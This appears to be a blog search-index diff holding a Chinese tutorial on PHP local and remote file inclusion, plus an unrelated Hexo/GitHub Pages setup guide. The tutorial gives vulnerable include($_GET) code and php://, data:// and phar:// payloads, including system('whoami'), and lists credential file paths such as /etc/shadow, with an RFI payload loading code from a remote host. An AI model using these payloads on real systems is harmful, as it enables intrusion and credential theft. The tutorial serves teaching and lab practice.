+什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。
+有时候由于网站功能需求，要包含的文件是一个变量，那么前端用户就可以进行选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。
+以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()区别如下:
+require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
+例子：在小皮的根目录下放一个test.php里面写上
+&lt;?php include $_GET[&#x27;test&#x27;];?&gt;
+
+在根目录下放另外一个file.php
+&lt;?php phpinfo();?&gt;
+
+构造url,把file.php作为参数传入
+http://192.168.127.231/test.php?test=file.php
+
+文件包含成功
+
+大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
+分类1.本地文件包含漏洞（LFI）仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
+eg:pikachu靶场的fileinclusion
+
+
+文件通过一个叫$filename的变量进行包含
+
+
+但是路径限制在了include下，那么在include文件夹下创建一个test.txt文件、
+&lt;?php phpinfo();?&gt;
+
+构造urlhttp://192.168.127.231/pikachu/vul/fileinclude/fi_local.php?filename=test.txt&amp;submit=提交查询
+这样test.txt就被包含执行了
+包含姿势php伪协议PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。
+有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。
+allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件allow_url_include On&#x2F;Off 允许或禁止引用URL文件php:&#x2F;&#x2F;input
+php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行
+当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。
+利用条件：
+
+allow_url_include &#x3D; On。
+对allow_url_fopen不做要求。
+
+php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
+在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出
+php:&#x2F;&#x2F;filter 的使用：如php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php
+其他姿势：
+file.php?file=php://filter/convert.base64-encode/resource=index.php
+
+效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。
+php:&#x2F;&#x2F;filter 伪协议组成：read&#x3D;&lt;读链的筛选列表&gt;resource&#x3D;&lt;要过滤的数据流&gt;write&#x3D;&lt;写链的筛选列表&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件
+read 对应要设置的过滤器：常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器
+phar:&#x2F;&#x2F;
+利用条件：
+php版本大于等于php5.3.0
+
+假设有个文件phpinfo.php，其内容为，打包成zip压缩包phpinfo.zip
+利用：
+指定绝对路径：
+file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php
+
+也可以使用相对路径：
+file.php?file=phar://phpinfo.zip/phpinfo.php
+
+zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）
+利用条件：
+
+php版本大于等于php5.3.0
+
+姿势：
+构造zip包的方法和phar相同。
+ 但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。
+格式示例：
+&lt;?php$a=($_GET[&quot;file&quot;]);include($a);?&gt;
+
+压缩及协议访问格式：
+压缩文件为.zip后缀zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php压缩文件为.bz2后缀compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php压缩文件为.gz后缀compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php
+data：URI schema利用条件：
+
+php版本大于等于php5.2
+allow_url_fopen &#x3D; On
+allow_url_include &#x3D; On
+
+姿势一：
+?file=data:text/plain,&lt;?php phpinfo();?&gt;
+
+也可以执行命令：
+?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;
+
+姿势二：
+?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+
+PD9waHAgc3lzdGVtKCd3aG9hbWknKTs&#x2F;Pg&#x3D;&#x3D;的base64解码为：
+&lt;?php system(&#x27;whoami&#x27;);?&gt;
+
+包含session利用条件：
+1.session文件路径已知，且其中内容部分可控。
+
+姿势：
+php的session文件的保存路径可以在phpinfo的session.save_path看到。
+常见的php-session存放位置：
+/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID
+
+其中，session文件的格式是固定的：sess_phpsessid.而phpsessid在发送的请求的cookie字段中可以看到。
+敏感文件位置Linux：
+/etc/passwd                                                                      //  账户信息/etc/shadow                                                                      //  账户密码文件/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件/etc/my.conf                                                                     //   mysql 配置文件
+
+Win：
+c:\boot.ini                                                                      // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml                                         //  IIS配置文件c:\windows\repair\sam                                                            //  存储Windows系统初次安装的密码c:\Program Files\mysql\my.ini                                                    //   MySQL配置c:\Program Files\mysql\data\mysql\user.MYD                                       //   MySQL rootc:\windows\php.ini                                                               //   php 配置信息c:\windows\my.ini                                                                //   MySQL 配置文件
+
+
+
+2.远程文件包含漏洞（RFI） 如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)
+能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 
+eg测试代码：
+
+
+&lt;?php	$file = @$_GET[&#x27;file&#x27;];	@include($file);?&gt;
+
+在远程服务器上的文件代码(test.txt)
+
+
+&lt;?phpphpinfo();?&gt;
+
+payload:
+http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>任意文件包含漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>任意文件包含漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建自己的GitHub-page</title>
+    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
+    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
+
+
+验证ssh -T git@github.com
+
+
+新建自己的仓库
+
+
+
+
+
+
+
+
+下载git下载链接:https://git-scm.com/downloads/win
+参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
+
+搭建本地博客创建博客目录
+安装hexonpm install -g hexo/cli
+
+
+#创建一个新的hexo项目hexo init myblogs
+
+
+此时的目录结构
+
+
+cd myblogsnpm install
+
+此时项目结构
+
+运行hexo项目
+hexo server
+
+
+部署到github获取个人token
+
+
+
+
+
+
+打开_config.yml
+
+编辑_config.yml
+当前博客目录安装git插件npm install hexo-deployer-git --save
+
+最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
+
+
+博客路径
+博客配置项在_config.yml中
+修改浏览器tab页标题
+
+#部署到githubhexo g -d
+
+
+]]></content>
+      <tags>
+        <tag>杂项</tag>
       </tags>
   </entry>
 </search>
